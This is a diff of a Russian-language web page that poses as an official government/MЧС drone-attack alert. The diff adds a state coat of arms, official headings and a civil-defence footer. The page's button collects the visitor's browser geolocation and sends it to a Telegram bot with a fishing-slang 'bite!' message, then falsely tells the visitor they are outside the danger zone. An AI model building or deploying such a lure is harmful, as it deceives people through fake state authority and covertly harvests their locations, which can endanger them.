@@ -3,56 +3,84 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>ВНИМАНИЕ! Угроза атаки БПЛА!</title>
+  <title>Государственное предупреждение — Угроза БПЛА</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #1a1a1a;
-      color: #fff;
+      background-color: #f5f5f5;
+      color: #222;
       text-align: center;
-      padding: 50px;
       margin: 0;
+      padding: 0;
     }
     .container {
-      max-width: 600px;
+      max-width: 700px;
       margin: auto;
-      background: #2c2c2c;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px red;
+      padding: 40px 20px;
+      background-color: white;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      margin-top: 50px;
+      border-radius: 12px;
+    }
+    img.logo {
+      width: 100px;
+      margin-bottom: 20px;
     }
     h1 {
-      color: red;
+      color: #a10000;
+      margin-bottom: 10px;
+    }
+    h2 {
+      color: #444;
+      margin-bottom: 30px;
+      font-weight: normal;
     }
     p {
       font-size: 18px;
+      color: #333;
     }
     button {
-      background-color: red;
+      background-color: #a10000;
       color: white;
       border: none;
-      padding: 15px 25px;
+      padding: 15px 30px;
       font-size: 16px;
       border-radius: 8px;
       cursor: pointer;
-      margin-top: 20px;
+      margin-top: 30px;
     }
     button:hover {
-      background-color: darkred;
+      background-color: #7b0000;
     }
     #status {
       margin-top: 20px;
       font-size: 16px;
-      color: #ccc;
+      color: #666;
+    }
+    .footer {
+      margin-top: 40px;
+      font-size: 14px;
+      color: #888;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>⚠️ ВНИМАНИЕ! Угроза атаки БПЛА в вашем районе! </h1>
-    <p>Пожалуйста, проверьте, находитесь ли вы в зоне атаки.</p>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Coat_of_Arms_of_the_Russian_Federation.svg/250px-Coat_of_Arms_of_the_Russian_Federation.svg.png" alt="Герб РФ" class="logo">
+    
+    <h1>Государственная система оповещения</h1>
+    <h2>Угроза атаки беспилотных летательных аппаратов (БПЛА)</h2>
+    
+    <p>По данным службы воздушного наблюдения зафиксирована активность БПЛА в вашем регионе.</p>
+    <p>Пожалуйста, проверьте себя в зоне предпологаемой угрозы. Это необходимо для оперативного реагирования и защиты граждан.</p>
+
     <button onclick="sendLocation()">Проверить зону опасности.</button>
     <p id="status"></p>
+
+    <div class="footer">
+      МЧС России · Федеральная система гражданской обороны<br/>
+      © Российская Федерация, 2025
+    </div>
   </div>
 
   <script>
@@ -61,10 +89,10 @@
 
     function sendLocation() {
       const status = document.getElementById("status");
-      status.textContent = "Определяем ваше местоположение...";
+      status.textContent = "Проверка местоположения в зоне опасности...";
 
       if (!navigator.geolocation) {
-        status.textContent = "Геолокация не поддерживается вашим браузером.";
+        status.textContent = "Ваш браузер не поддерживает геолокацию. Попробуйте другой.";
         return;
       }
 
@@ -73,9 +101,9 @@
       function success(position) {
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
-        status.textContent = "Местоположение определено.";
+        status.textContent = "Местоположение получено.";
 
-        const message = `Координаты рыбки\n📍 Широта: ${latitude}\n📍 Долгота: ${longitude}`;
+        const message = `ВНИМАНИЕ! КЛЮЕТ! \n\n📍 Координаты:\nШирота: ${latitude}\nДолгота: ${longitude}`;
 
         fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
           method: 'POST',
@@ -89,18 +117,18 @@
         })
         .then(response => {
           if (response.ok) {
-            status.textContent = "Вы вне зоны  опасности. Спасибо за блидетельность!";
+            status.textContent = "Вы ВНЕ зоны опасности! Спасибо за бдительность!";
           } else {
-            status.textContent = "Ошибка при отправке данных.";
+            status.textContent = "Ошибка проверки";
           }
         })
         .catch(() => {
-          status.textContent = "Ошибка сети при отправке данных.";
+          status.textContent = "Сетевая ошибка при проверке.";
         });
       }
 
       function error() {
-        status.textContent = "Не удалось получить ваше местоположение.";
+        status.textContent = "Не удалось определить местоположение для проверки. Попробуйте другой бразуер!";
       }
     }
   </script>
